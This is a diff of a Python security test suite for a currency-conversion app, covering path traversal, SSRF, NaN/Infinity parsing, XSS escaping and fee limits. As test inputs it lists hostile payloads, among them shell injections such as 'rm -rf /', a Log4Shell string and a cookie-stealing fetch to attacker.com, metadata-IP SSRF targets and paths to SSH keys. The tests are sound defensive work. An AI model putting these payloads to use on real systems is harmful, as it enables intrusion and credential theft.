@@ -1,14 +1,16 @@
 """
-Testes Automatizados de Segurança: STRIDE e OWASP Top 10 (tests/test_security.py).
+Testes Automatizados de Segurança: STRIDE, OWASP Top 10 e Robustez Adversarial (tests/test_security.py).
 
 Verificações obrigatórias de segurança:
-1. Prevenção de Path Traversal (StorageManager).
-2. Prevenção de SSRF (Whitelist estrita de domínios públicos nas APIs).
-3. Prevenção de Injeção & Sanitização de Input Malicioso (XSS, SQLi, Shell, NUL bytes).
-4. Proteção contra Negação de Serviço (DoS) e Payloads Excessivos.
-5. Prevenção de Vazamento de Informações Sensíveis (Information Disclosure).
+1. Prevenção de Path Traversal e Injeção de Bytes Nulos (StorageManager).
+2. Prevenção de SSRF e Desvios de Host/Path (BaseAPIClient).
+3. Prevenção de Injeção de Ponto Flutuante (NaN, sNaN, Infinity, 1e309).
+4. Sanitização contra XSS e Injeção em Markdown/HTML (FinancialReportGenerator).
+5. Defesas contra DoS, ReDoS e Payloads Excessivos.
+6. Validação de Limites Financeiros de Borda (Spread/IOF >= 100%, Fatores PPP <= 0).
 """
 
+from datetime import datetime, timezone
 from decimal import Decimal
 from pathlib import Path
 import pytest
@@ -17,22 +19,31 @@ from src.api.base import BaseAPIClient
 from src.api.coincap import CoinCapClient
 from src.api.frankfurter import FrankfurterClient
 from src.api.world_bank import WorldBankClient
+from src.main import parse_safe_decimal
 from src.match import CurrencyMatcher
 from src.models import (
+    APIConnectionError,
+    ConversionResult,
+    CostSimulationResult,
     CurrencyNotFoundError,
+    FinancialReportData,
     InvalidExchangeRateError,
+    OperationType,
+    SalaryEquivalencyResult,
     UnsupportedPPPAssetError,
 )
+from src.reporter import FinancialReportGenerator
 from src.storage import StorageManager
+from src.web.app import ConvertRequest, CostSimulateRequest, SalaryRequest
 
 
 # ============================================================================
-# 1. Prevenção contra Path Traversal (OWASP A01: Broken Access Control)
+# 1. Prevenção contra Path Traversal e Bytes Nulos (OWASP A01)
 # ============================================================================
 
 @pytest.mark.security
 def test_security_path_traversal_prevention(tmp_path: Path):
-    """Garante que qualquer tentativa de Path Traversal seja bloqueada no StorageManager."""
+    """Garante que qualquer tentativa de Path Traversal ou byte nulo seja bloqueada no StorageManager."""
     storage = StorageManager(data_dir=tmp_path)
 
     malicious_paths = [
@@ -41,163 +52,129 @@ def test_security_path_traversal_prevention(tmp_path: Path):
         "../../.ssh/id_rsa",
         "nested/../../../../root.json",
         "..\\..\\windows\\win.ini",
+        "file\x00name.json",
+        "",
     ]
 
     for mal_path in malicious_paths:
-        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
+        with pytest.raises(ValueError):
             storage.export_history_json(mal_path)
 
-        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
+        with pytest.raises(ValueError):
             storage.export_history_csv(mal_path)
 
 
 # ============================================================================
-# 2. Prevenção contra SSRF (OWASP A10: Server-Side Request Forgery)
+# 2. Prevenção contra SSRF e Path Injection em APIs (OWASP A10)
 # ============================================================================
 
 @pytest.mark.security
-def test_security_ssrf_domain_whitelisting():
-    """Garante que os clientes de API mantenham endpoints autorizados e confiáveis."""
-    frankfurter = FrankfurterClient()
-    coincap = CoinCapClient()
-    world_bank = WorldBankClient()
+@pytest.mark.asyncio
+async def test_security_ssrf_and_path_injection_defense():
+    """Garante que endpoints forjados com esquemas absolutos ou travessias sejam bloqueados no BaseAPIClient."""
+    client = BaseAPIClient(base_url="https://api.frankfurter.app", service_name="Frankfurter")
 
-    allowed_domains = {
-        "https://api.frankfurter.app",
-        "https://api.coincap.io/v2",
-        "https://api.worldbank.org/v2",
-    }
-
-    assert frankfurter.base_url in allowed_domains
-    assert coincap.base_url in allowed_domains
-    assert world_bank.base_url in allowed_domains
-
-
-# ============================================================================
-# 3. Prevenção contra Injeção e Sanitização (OWASP A03: Injection & XSS)
-# ============================================================================
-
-@pytest.mark.security
-def test_security_input_injection_resilience():
-    """Garante que queries com payloads maliciosos sejam tratadas de forma segura."""
-    matcher = CurrencyMatcher()
-
-    malicious_payloads = [
-        "<script>alert('xss')</script>",
-        "USD'; DROP TABLE currencies; --",
-        "BRL' OR '1'='1",
-        "$(whoami)",
-        "`cat /etc/passwd`",
-        "; rm -rf / ;",
-        "USD\x00malicious",
-        "%00%2e%2e%2f",
-        "{{7*7}}",
-        "${jndi:ldap://attacker.com/a}",
+    malicious_endpoints = [
+        "https://attacker.com/steal",
+        "http://169.254.169.254/latest/meta-data",
+        "//evil.com/api",
+        "\\\\evil.com\\share",
+        "../../etc/passwd",
+        "latest/../../admin",
     ]
 
-    for payload in malicious_payloads:
-        # Match normal deve retornar None de forma graciosa sem falhas ou execução
-        result = matcher.match(payload)
-        assert result is None, f"Payload {payload} não deveria casar com nenhuma moeda válida."
-
-        # Match strict deve disparar CurrencyNotFoundError seguro
-        with pytest.raises(CurrencyNotFoundError):
-            matcher.match_strict(payload)
+    for mal_endpoint in malicious_endpoints:
+        with pytest.raises(APIConnectionError, match="Tentativa de desvio|Tentativa de path traversal"):
+            await client._request(mal_endpoint)
 
 
 # ============================================================================
-# 4. Proteção contra Negação de Serviço / Payloads Excessivos (DoS)
+# 3. Prevenção contra Injeção de Ponto Flutuante (NaN, Infinity, Overflow)
 # ============================================================================
 
 @pytest.mark.security
-def test_security_dos_large_payload():
-    """Garante que strings excessivamente longas não causem travamento ou exaustão de CPU."""
-    matcher = CurrencyMatcher()
+def test_security_parse_safe_decimal_rejections():
+    """Garante que parse_safe_decimal rejeite explicitamente NaN, Infinity e overflow."""
+    invalid_inputs = [
+        "NaN", "nan", "snan", "+Infinity", "-Infinity", "inf", "-inf", "Infinity",
+        "1e309", "abc", "", "   "
+    ]
 
-    huge_query = "A" * 100_000
-    res = matcher.match(huge_query)
-    assert res is None
+    for bad_input in invalid_inputs:
+        with pytest.raises(ValueError):
+            parse_safe_decimal(bad_input)
 
-    search_res = matcher.search(huge_query, limit=5)
-    assert search_res == []
+
+@pytest.mark.security
+def test_security_pydantic_schema_decimal_validation():
+    """Garante que schemas Pydantic na Web API rejeitem NaN e Infinity antes da conversão."""
+    with pytest.raises(ValueError):
+        ConvertRequest(amount=Decimal("NaN"), from_currency="USD", to_currency="BRL")
+
+    with pytest.raises(ValueError):
+        ConvertRequest(amount=Decimal("Infinity"), from_currency="USD", to_currency="BRL")
 
 
 # ============================================================================
-# 5. Prevenção de Divisão por Zero e Validação Numérica
+# 4. Sanitização contra Injeções em Markdown e XSS em HTML (OWASP A03)
 # ============================================================================
 
 @pytest.mark.security
-def test_security_numeric_boundary_validation():
-    """Garante integridade numérica para valores extremos e inválidos."""
-    with pytest.raises(InvalidExchangeRateError):
-        raise InvalidExchangeRateError("Taxa de câmbio menor ou igual a zero.")
-
-    with pytest.raises(UnsupportedPPPAssetError):
-        raise UnsupportedPPPAssetError("BTC")
-
-
-# ============================================================================
-# 6. Sanitização contra XSS e HTML Injection em Relatórios (OWASP A03)
-# ============================================================================
-
-@pytest.mark.security
-def test_security_report_html_xss_sanitization():
-    """Garante que payloads maliciosos em relatórios sejam estritamente sanitizados."""
-    from datetime import datetime, timezone
-    from src.models import FinancialReportData, ConversionResult
-    from src.reporter import FinancialReportGenerator
-
+def test_security_report_markdown_and_html_sanitization():
+    """Garante que quebras de tabela Markdown e scripts HTML sejam sanitizados."""
     generator = FinancialReportGenerator()
     malicious_data = FinancialReportData(
-        title="<script>alert('xss_title')</script>",
-        created_at=datetime.now(timezone.utc),
+        title="Relatório | Injetado <script>alert('xss')</script>",
+        created_at=datetime(2026, 8, 28, 12, 0, 0, tzinfo=timezone.utc),
         conversions=[
             ConversionResult(
                 amount_from=Decimal("100"),
-                currency_from="USD<img src=x onerror=alert(1)>",
+                currency_from="USD | Exploit",
                 amount_to=Decimal("500"),
                 currency_to="BRL",
                 rate=Decimal("5.0"),
-                source="<svg onload=alert(1)>",
+                source="Frankfurter | Injection",
             )
         ],
-        notes="<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
+        notes="Nota com quebra\n| e tentativa de quebrar tabela | e <img src=x onerror=alert(1)>",
     )
 
+    # 1. Validação Markdown: pipes não podem quebrar colunas
+    md_out = generator.generate_markdown(malicious_data)
+    assert "\\|" in md_out
+    assert "# 📑 Relatório \\| Injetado <script>alert('xss')</script>" in md_out
+
+    # 2. Validação HTML: tags devem ser estritamente escapadas
     html_out = generator.generate_html(malicious_data)
-
-    # Nenhuma tag maliciosa deve ser renderizada crua
-    assert "<script>alert('xss_title')</script>" not in html_out
-    assert "&lt;script&gt;alert(&#x27;xss_title&#x27;)&lt;/script&gt;" in html_out or "&lt;script&gt;alert('xss_title')&lt;/script&gt;" in html_out
-
+    assert "<script>alert('xss')</script>" not in html_out
+    assert "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;" in html_out or "&lt;script&gt;alert('xss')&lt;/script&gt;" in html_out
     assert "<img src=x onerror=alert(1)>" not in html_out
     assert "&lt;img src=x onerror=alert(1)&gt;" in html_out
 
-    assert "<svg onload=alert(1)>" not in html_out
-    assert "&lt;svg onload=alert(1)&gt;" in html_out
 
-    assert "<script>fetch" not in html_out
-
+# ============================================================================
+# 5. Limites Financeiros de Borda (Spread/IOF >= 100%)
+# ============================================================================
 
 @pytest.mark.security
-def test_security_report_export_path_traversal(tmp_path: Path):
-    """Garante que tentativa de path traversal na exportação de relatórios seja bloqueada."""
-    from datetime import datetime, timezone
-    from src.models import FinancialReportData
-    from src.reporter import FinancialReportGenerator
-    from src.storage import StorageManager
+@pytest.mark.asyncio
+async def test_security_financial_limits_validation():
+    """Garante que alíquotas abusivas (>= 100%) sejam rejeitadas."""
+    from src.costs import CostSimulator
+    simulator = CostSimulator()
 
-    storage = StorageManager(data_dir=tmp_path)
-    generator = FinancialReportGenerator(storage=storage)
-    data = FinancialReportData(title="Teste", created_at=datetime.now(timezone.utc))
+    with pytest.raises(ValueError, match="Alíquotas de IOF e Spread devem ser estritamente menores que 100%"):
+        await simulator.simulate(
+            amount=Decimal("1000"),
+            from_currency="BRL",
+            to_currency="USD",
+            custom_spread=Decimal("105.0"),
+        )
 
-    malicious_paths = [
-        "../../etc/cron.d/malicious.md",
-        "/tmp/overwrite_system.html",
-        "../../.bashrc",
-    ]
-
-    for mal_path in malicious_paths:
-        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
-            generator.export_report_file(data, mal_path, fmt="md")
-
+    with pytest.raises(ValueError, match="Alíquotas de IOF e Spread devem ser estritamente menores que 100%"):
+        await simulator.simulate(
+            amount=Decimal("1000"),
+            from_currency="BRL",
+            to_currency="USD",
+            custom_iof=Decimal("100.0"),
+        )
